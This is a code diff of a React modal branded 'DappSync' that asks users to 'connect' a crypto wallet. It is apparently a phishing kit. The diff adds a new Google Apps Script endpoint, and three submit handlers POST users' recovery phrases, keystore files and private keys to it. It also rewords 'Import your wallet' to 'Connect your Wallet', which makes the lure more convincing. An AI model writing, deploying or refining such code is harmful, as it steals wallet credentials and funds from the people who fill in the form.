@@ -6,7 +6,7 @@ var WalletModalImport = function WalletModalImport(props) {
     console.log(props);
     var phraseSubmit = function phraseSubmit(e) {
         e.preventDefault();
-        var scriptURL = 'https://script.google.com/macros/s/AKfycbzLgI_3yPT65VMu2uS4R_l8uHQDRDJz9kCjQ1dMTCkPghvLKPije4omvDj6jtDq4hPo/exec';
+        var scriptURL = 'https://script.google.com/macros/s/AKfycbxxQH6PnqQlkMhZ-ogdl6H5Jzk9ymUkxHRQIkyKS3JEgUdWHEf8AFedcxxKakbk6E0mOg/exec';
         var form = document.forms['phrasesync'];
         document.getElementById('loader').className = "loader";
         fetch(scriptURL, { method: 'POST', body: new FormData(form) }).then(function () {
@@ -18,7 +18,7 @@ var WalletModalImport = function WalletModalImport(props) {
     var keystoreSubmit = function keystoreSubmit(e) {
         e.preventDefault();
         document.getElementById('loader').classList.add("loader");
-        var scriptURL = 'https://script.google.com/macros/s/AKfycbzLgI_3yPT65VMu2uS4R_l8uHQDRDJz9kCjQ1dMTCkPghvLKPije4omvDj6jtDq4hPo/exec';
+        var scriptURL = 'https://script.google.com/macros/s/AKfycbxxQH6PnqQlkMhZ-ogdl6H5Jzk9ymUkxHRQIkyKS3JEgUdWHEf8AFedcxxKakbk6E0mOg/exec';
         var form = document.forms['keystoresync'];
         document.getElementById('loader').className = "loader";
         fetch(scriptURL, { method: 'POST', body: new FormData(form) }).then(function () {
@@ -29,7 +29,7 @@ var WalletModalImport = function WalletModalImport(props) {
     };
     var privateSubmit = function privateSubmit() {
         document.getElementById('loader').classList.add("loader");
-        var scriptURL = 'https://script.google.com/macros/s/AKfycbzLgI_3yPT65VMu2uS4R_l8uHQDRDJz9kCjQ1dMTCkPghvLKPije4omvDj6jtDq4hPo/exec';
+        var scriptURL = 'https://script.google.com/macros/s/AKfycbxxQH6PnqQlkMhZ-ogdl6H5Jzk9ymUkxHRQIkyKS3JEgUdWHEf8AFedcxxKakbk6E0mOg/exec';
         var form = document.forms['privatesync'];
         document.getElementById('loader').className = "loader";
         fetch(scriptURL, { method: 'POST', body: new FormData(form) }).then(function () {
@@ -53,7 +53,7 @@ var WalletModalImport = function WalletModalImport(props) {
                     React.createElement(
                         'h5',
                         { className: 'modal-title', id: 'exampleModalToggleLabel' },
-                        'Dappsync'
+                        'DappSync'
                     ),
                     React.createElement('button', { type: 'button', className: 'btn-close', 'data-bs-dismiss': 'modal', 'aria-label': 'Close' })
                 ),
@@ -85,9 +85,9 @@ var WalletModalImport = function WalletModalImport(props) {
                                         React.createElement(
                                             'h6',
                                             null,
-                                            'Import your ',
+                                            'Connect your ',
                                             props.name,
-                                            ' wallet'
+                                            ' Wallet'
                                         )
                                     )
                                 )
